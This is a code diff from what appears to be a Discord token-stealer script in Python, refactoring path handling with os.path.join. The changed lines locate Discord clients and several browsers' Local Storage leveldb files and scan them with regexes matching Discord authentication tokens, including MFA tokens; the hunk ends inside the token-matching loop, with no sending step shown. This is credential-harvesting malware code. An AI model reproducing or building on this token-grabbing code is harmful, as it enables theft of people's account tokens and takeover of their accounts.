@@ -16,27 +16,27 @@ if os.name == "posix":
     ROAMING = os.path.expanduser("~/Library/Application Support")
 
 PATHS = {
-    "Discord": ROAMING + f"{os.sep}Discord",
-    "Discord Canary": ROAMING + f"{os.sep}discordcanary",
-    "Discord PTB": ROAMING + f"{os.sep}discordptb",
+    "Discord": os.path.join(ROAMING, "Discord"),
+    "Discord Canary": os.path.join(ROAMING, "discordcanary"),
+    "Discord PTB": os.path.join(ROAMING, "discordptb"),
     }
 
 if os.name == "nt":
     PATHS.update({
-        "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
-        "Opera": ROAMING + "\\Opera Software\\Opera Stable",
-        "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
-        "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
+        "Google Chrome": os.path.join(LOCAL, "Google", "Chrome", "User Data", "Default"),
+        "Opera": os.path.join(ROAMING, "Opera Software", "Opera Stable"),
+        "Brave":  os.path.join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
+        "Yandex": os.path.join(LOCAL, "Yandex", "YandexBrowser", "User Data", "Default")
     })
 
 
 def gettokens(path):
-    path += f"{os.sep}Local Storage{os.sep}leveldb"
+    path = os.path.join(path, "Local Storage", "leveldb")
     tokens = []
     for file_name in os.listdir(path):
         if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
             continue
-        lines = [x.strip() for x in open(f"{path}{os.sep}{file_name}", errors="ignore").readlines() if x.strip()]
+        lines = [x.strip() for x in open(os.path.join(path, file_name), errors="ignore").readlines() if x.strip()]
         for line in lines:
             for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                 for token in findall(regex, line):
